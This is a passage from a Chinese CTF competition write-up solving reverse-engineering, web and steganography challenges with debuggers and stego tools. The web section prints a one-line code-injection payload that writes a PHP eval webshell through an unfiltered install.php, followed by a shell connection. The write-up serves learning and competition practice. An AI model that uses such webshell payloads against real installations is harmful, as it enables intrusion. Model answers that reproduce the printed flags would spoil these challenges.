      0x00, 0xFF, 0x05, 0xFF, 0x0F, 0x01, 0xFF, 0x0C, 0x0A, 0x09,
      0x0D, 0x03, 0xFF, 0x0F, 0x0B, 0xFF, 0x03, 0x0C, 0xFF, 0x0E,
      0x05, 0xFF, 0xFF, 0x09, 0xFF, 0x04, 0x08, 0x0A, 0x0E, 0x08,
      0xFF, 0xFF, 0x07, 0x05, 0x0D, 0x0F, 0x04, 0x03, 0xFF, 0xFF,
      0x01, 0x0C, 0x09, 0x00, 0xFF, 0x05, 0x0D, 0x09, 0x06, 0x04,
      0x08, 0x0A, 0x01, 0x0C, 0x0F, 0x0E, 0xFF, 0x07, 0x02, 0x0B,
      0x03, 0xFF, 0x04, 0x0A, 0xFF, 0x0B, 0x09, 0x02, 0x0D, 0x00,
      0xFF, 0x08, 0x0E, 0xFF, 0x0F, 0x06
    };
    int main()
    {
        for (int i = 0; i < 16; i++)
        {
            for (int j = 0; j < 16; j++)
                printf("\"%d\",", byte_40A0[i][j] + 1);
        }
        return 0;
    }
    

fd改包之后，重新发送，就得到结果了。

![](https://p1.ssl.qhimg.com/t016c591fdeae0e52ce.png)

得到的数据和题目要求的格式不太一样（0-9）（a-f），手动转换实在是太慢了，编写程序自动转换：

    
    
    #include <cstdio>
    int main()
    {
        for(;;)
        {
            int t;
            scanf("%d", &t);
            if (t <= 10) printf("%d", t - 1);
            if (t > 10) printf("%c", t - 11 + 'a');
        }
        return 0;
    }
    

![](https://p5.ssl.qhimg.com/t01440055f0b2133239.png)

**flag{765c98e78644507b8dfb1552693e467871026d26ba03c175}**

### **e**

这道题因为ida调试不起来一直没做，没想到这么简单。

用gdb可以调试，用gdbserver来与ida连接（重度ida依赖，做pwn的时候就是重度gdb依赖）

先下个断点

![](https://p0.ssl.qhimg.com/t01bb0436e90f636899.png)

启动调试，跟进去

![](https://p5.ssl.qhimg.com/t01e1f0ecdb25220282.png)

一直单步到 **jmp eax** ，跳转到另一个区域

![](https://p1.ssl.qhimg.com/t01417bc3b4bf8a0675.png)

进入到 **第二个call**

![](https://p5.ssl.qhimg.com/t0183e043f36af6ca17.png)

这个函数的代码相当复杂，但是我们需要注意的就是什么时候输出 **NONONO**

观察到：

![](https://p4.ssl.qhimg.com/t01dfdbcc802ee68ce2.png)

如果进入下面的分支就会输出 **NONONO** ，所以猜测上面的分支就是会输出正确的flag。

所以如何让v6 == true呢？

发现v6就在我下的断点那一行赋值了（红色那行），点进去那个调用的函数

![](https://p1.ssl.qhimg.com/t01256ecc40bc0905be.png)

盲测是strcmp。

由于是gdbserver调试，所以不能直接在伪代码看内容，所以我们转回汇编

![](https://p2.ssl.qhimg.com/t0102bf372810ba9894.png)

发现流程图也是非常清晰的分支，在x86就是栈传参，所以eax就是比较的内容之一，查看数据

![](https://p2.ssl.qhimg.com/t01bf72c167830fc6d1.png)

尝试输入 **DDDJJJBBBRRREEE**

![](https://p1.ssl.qhimg.com/t01155affd29c5538a9.png)

成功！

**flag{DDDJJJBBBRRREEE}**

###  UnrealFlag

这道题虽然拿了一血，但其实还可以更快，因为找工具用了大部分的时间。

主要思路是参照：<https://bbs.pediy.com/thread-255724.htm>。这篇文章的

用IDA载入关键文件 **FindFlag-Win64-Shipping.exe** ，查找字符串关键词 **index offset** （时间有点久）

![](https://p0.ssl.qhimg.com/t010e4f6f7f2aebd2d0.png)

双击进去之后按X查找引用

![](https://p2.ssl.qhimg.com/t01931275b3d85f863a.png)

发现有两个引用，我们都过去看看，并且都下断点

![](https://p0.ssl.qhimg.com/t01116fdac99d0f2bd2.png)

这个if有点长，找到他上面的下断点，其实大概猜到这里已经不是了。

![](https://p2.ssl.qhimg.com/t01d431112653647bfc.png)

![](https://p2.ssl.qhimg.com/t01bc139865ce9fa266.png)

设置调试，并且跑起来

![](https://p4.ssl.qhimg.com/t01715bbebb5a2c5dcd.png)

程序成功跑起来了，接下来就是一些盲目的寻找

![](https://p5.ssl.qhimg.com/t0179745e1c57bcd1eb.png)

发现图中黄色的函数里面有点玄机

![](https://p3.ssl.qhimg.com/t013316e9a134047198.png)

因为他这个函数内部似乎有打印key的一个异常输出

![](https://p2.ssl.qhimg.com/t012b58f40467770829.png)

我们可以走到他附近看看，由于这块的伪代码效果不是很好，我们直接去汇编看，每一个调用函数都进去看看

![](https://p2.ssl.qhimg.com/t014ccacfa1cf380557.png)

会走到这样的一个函数

![](https://p0.ssl.qhimg.com/t019950180d9063026a.png)

发现这里有个memcpy，而且copy的size也是0x20，虽然这部分没有走到，不过我大胆地猜测这里应该就是用于前面异常报错的部分，所以查看对应的
**a1** 内容，先按 ***** 设置为数组

![](https://p1.ssl.qhimg.com/t01306154740fa85479.png)

并且 **Shift + E** 导出

![](https://p3.ssl.qhimg.com/t018f2c8efe3f14a105.png)

在之前的教程里面用的工具在这道题里面似乎不行，所以我一直没搞清楚要用什么来解包，然后查看 **umodel**
的官网，本来想找找怎么输入AES的格式是怎么样的，也没有找到，最后出题人告诉我AES输入的格式是前导0x的16进制字符串（其他软件都是base64）

还有就是记得要用最新版的

<https://github.com/ProgramingClassroom/UModel>

选择PAK包之后，输入AES秘钥

![](https://p1.ssl.qhimg.com/t0188ed2318243a9c70.png)

就可以成功解包了

![](https://p2.ssl.qhimg.com/t01890cef5e985bbd2b.png)

找到 **flag.uasset** ，并双击打开，这是一个材质文件

![](https://p0.ssl.qhimg.com/t010a04117d4d39d5ec.png)

但是似乎有些变形了，有些字符看不清楚，不过多试几次就能试出来。

## WEB

###  虎山行

非预期，似乎直接RCE了，看到文件的时候我还一脸懵逼。

刚开始对这个系统进行了搜索，发现了先知社区的一篇文章，不过有些繁琐，而且也不能直接RCE，故手动寻找了这个系统的文件。

发现系统存在文件 **install.php**
来让我们可以对文件进行手动的安装，所以就尝试对这个文件进行分析，之前也了解过dz论坛的一些漏洞，发现在安装文件中出现问题的可能性还是蛮大的，经过分析发现下处漏洞：

![](https://p2.ssl.qhimg.com/t019aeec0e75b6519ef.png)

发现在安装文件的此处，没有对输入的信息进行任何的过滤，这导致我们可以直接通过输入的内容来往该文件中写入shell，例如我们可以构造payload，使得数据内容闭合，并且把后续的内容都注释掉。

    
    
    wjh');eval($_POST[a]);//
    

之后使用蚁剑进行连接

![](https://p2.ssl.qhimg.com/t01ce71c0f5263fd26c.png)

看到挺多莫名奇妙的文件的，估计是因为我是非预期的缘故。

## MISC

###  十八般兵器

下载之后得到一个压缩包文件，发现压缩包存在密码，从旁边的注释信息得到密码进行尝试

![](https://p1.ssl.qhimg.com/t017ee9f97c578df096.png)

解压后得到文件：

![](https://p3.ssl.qhimg.com/t01192d2cc4ed5070fd.png)

猜测是对文件的隐写，且因为其实jpg文件，尝试用JPHS来得到隐藏内容

![](https://p3.ssl.qhimg.com/t013a72f421b3859679.png)

对每个兵器都进行读取：

![](https://p2.ssl.qhimg.com/t019860aa8e630ba096.png)

可以得到多个文件，把下面的数字都连接起来，前十种兵器对应10进制，后八种对应8进制，

最后转字符串信息就可以得到

**flag{CTFshow_10_bA_Ban_b1ng_Q1}**

###  请问大吉杯的签到是在这里签吗

下载得到一个二维码文件，尝试扫码，发现没有重要信息。

于是尝试观察文件，发现在末尾处有一个PK压缩包，尝试解压，有多个套娃，得到全部的二维码之后，对其内容进行分析，发现在第二个二维码处有提示，于是猜测第二个二维码存在隐写。

通过 **Stegsolve** 打开进行查看

发现在0通道和1通道切换的时候，图片内容会变化，猜测有隐写内容，但是查看无果。

再继续查看的时候，发现这些内容都被显示出来

![](https://p3.ssl.qhimg.com/t012139a9ede3907d67.png)

猪圈密码解密，得到

**flag{dajiadoaidjb}**

###  牛年大吉

丢进binwalk跑了一下，发现有一张图片和一个压缩包信息。

![](https://p1.ssl.qhimg.com/t01e425a50f99c4109a.png)

使用

    
    
    binwalk -D png test.vhd
    binwalk -D 7-zip test.vhd
    

进行分离，得到压缩包和图片：  
修改其扩展名使得能被windows识别：

![](https://p1.ssl.qhimg.com/t01f0ec62c6ada76683.png)

解压压缩包需要密码，密码在图片头里面，说实话这真的不好猜

解压后得到

**flag{CTFshow_The_Year_of_the_Ox}**

###  碑寺六十四卦

发现文件很大，相对于size来说不匹配，猜测有隐写。

根据提示把图片反色，并查看

![](https://p5.ssl.qhimg.com/t01ed697bcc5e4a9c1a.png)

发现存在一个png文件，导出后查看

把开头的无用内容删除后，得到：

![](https://p5.ssl.qhimg.com/t014926948ca1265055.png)

发现文件

![](https://p0.ssl.qhimg.com/t01704ead0611711b42.png)

猜测从上到下依次对应着 **base64编码** 的索引，之前UNCTF2020也考过一道类似的。

手动对应了一下，发现开头就是flag，加强了信心。

最后得到

**flag{Le1bnizD0uShuoH4o}**

###  AA86

刚开始无思路，在仔细看题目之后，决定去装个DOS看看，发现内容可以在DOS中执行，最后得到flag

**flag{https://utf-8.jp/public/sas/index.html}**

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **wjh** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/229711](/post/id/229711)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __4赞

 __收藏

![](https://p4.ssl.qhimg.com/t0162586615c462960c.png) wjh

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

